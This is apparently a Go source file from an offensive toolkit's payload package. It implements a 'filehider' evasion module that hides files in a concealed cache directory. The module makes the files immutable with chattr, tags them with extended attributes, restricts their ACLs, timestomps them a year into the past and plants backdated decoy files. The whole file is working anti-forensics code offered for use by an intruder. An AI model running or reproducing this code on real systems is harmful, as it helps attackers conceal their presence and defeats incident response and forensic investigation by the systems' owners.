package payloads

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

func init() {
	Register(&FileHider{})
}

type FileHider struct{}

func (f *FileHider) Name() string     { return "filehider" }
func (f *FileHider) Category() string { return "evasion" }
func (f *FileHider) Description() string {
	return "Hide files via chattr, extended attributes, ACLs, timestomping"
}

func (f *FileHider) Execute(args map[string]string) ([]byte, error) {
	dir := args["dir"]
	if dir == "" {
		home, _ := os.UserHomeDir()
		dir = filepath.Join(home, ".cache", ".rogue")
	}
	os.MkdirAll(dir, 0700)

	result := f.hide(dir)
	return MarshalJSON(result)
}

type filehiderResult struct {
	Timestamp string        `json:"timestamp"`
	TargetDir string        `json:"target_dir"`
	Methods   []hiderMethod `json:"methods"`
	Files     []hiddenFile  `json:"files"`
}

type hiderMethod struct {
	Name    string `json:"name"`
	Success bool   `json:"success"`
	Detail  string `json:"detail"`
}

type hiddenFile struct {
	Path   string `json:"path"`
	Method string `json:"method"`
}

func (f *FileHider) hide(dir string) *filehiderResult {
	r := &filehiderResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		TargetDir: dir,
	}

	// Method 1: chattr +i (immutable)
	r.Methods = append(r.Methods, applyChattr(dir, r))

	// Method 2: Extended attributes
	r.Methods = append(r.Methods, applyXattr(dir, r))

	// Method 3: ACL restrictions
	r.Methods = append(r.Methods, applyACL(dir, r))

	// Method 4: Timestomping
	r.Methods = append(r.Methods, applyTimestomp(dir, r))

	// Method 5: Decoy files
	r.Methods = append(r.Methods, createDecoys(dir, r))

	return r
}

func applyChattr(dir string, r *filehiderResult) hiderMethod {
	m := hiderMethod{Name: "chattr +i"}
	if _, err := exec.LookPath("chattr"); err != nil {
		m.Detail = "chattr not found"
		return m
	}

	err := filepath.Walk(dir, func(path string, fi os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !fi.IsDir() {
			exec.Command("chattr", "+i", path).Run()
			r.Files = append(r.Files, hiddenFile{Path: path, Method: "chattr_immutable"})
		}
		return nil
	})
	_ = err

	m.Success = true
	m.Detail = fmt.Sprintf("Applied chattr +i to files in %s", dir)
	return m
}

func applyXattr(dir string, r *filehiderResult) hiderMethod {
	m := hiderMethod{Name: "extended_attrs"}
	if _, err := exec.LookPath("setfattr"); err != nil {
		m.Detail = "setfattr not found"
		return m
	}

	filepath.Walk(dir, func(path string, fi os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !fi.IsDir() {
			exec.Command("setfattr", "-n", "user.hidden", "-v", "1", path).Run()
			// Set mtime to 1 year ago
			pastTime := time.Now().Add(-365 * 24 * time.Hour)
			os.Chtimes(path, pastTime, pastTime)
		}
		return nil
	})

	m.Success = true
	m.Detail = "Applied extended attributes"
	return m
}

func applyACL(dir string, r *filehiderResult) hiderMethod {
	m := hiderMethod{Name: "ACL"}
	if _, err := exec.LookPath("setfacl"); err != nil {
		m.Detail = "setfacl not found"
		return m
	}

	filepath.Walk(dir, func(path string, fi os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !fi.IsDir() {
			// Remove all perms for other
			os.Chmod(path, 0600)
			exec.Command("setfacl", "-m", "u:nobody:---", path).Run()
			exec.Command("setfacl", "-m", "g:nogroup:---", path).Run()
		}
		return nil
	})

	m.Success = true
	m.Detail = "Applied ACL restrictions"
	return m
}

func applyTimestomp(dir string, r *filehiderResult) hiderMethod {
	m := hiderMethod{Name: "timestomp"}
	pastTime := time.Now().Add(-365 * 24 * time.Hour)

	filepath.Walk(dir, func(path string, fi os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		os.Chtimes(path, pastTime, pastTime)
		return nil
	})

	m.Success = true
	m.Detail = "Timestamps set to 1 year ago"
	return m
}

func createDecoys(dir string, r *filehiderResult) hiderMethod {
	m := hiderMethod{Name: "decoy_files"}
	names := []string{
		"system_logs.tar.gz",
		"kernel_backup.bin",
		"config_backup.tar",
		"tmp_cache.dat",
	}

	decoyDir := filepath.Join(dir, ".decoy")
	os.MkdirAll(decoyDir, 0755)

	for _, name := range names {
		path := filepath.Join(decoyDir, name)
		content := fmt.Sprintf("# %s backup\n# Generated: %s\n", name, time.Now().Format(time.RFC3339))
		os.WriteFile(path, []byte(content), 0644)
		oldTime := time.Now().Add(-time.Duration(60+len(name)) * 24 * time.Hour)
		os.Chtimes(path, oldTime, oldTime)
		r.Files = append(r.Files, hiddenFile{Path: path, Method: "decoy"})
	}

	m.Success = true
	m.Detail = fmt.Sprintf("Created %d decoy files", len(names))
	return m
}

var _ = syscall.S_IRUSR
var _ = strings.TrimSpace
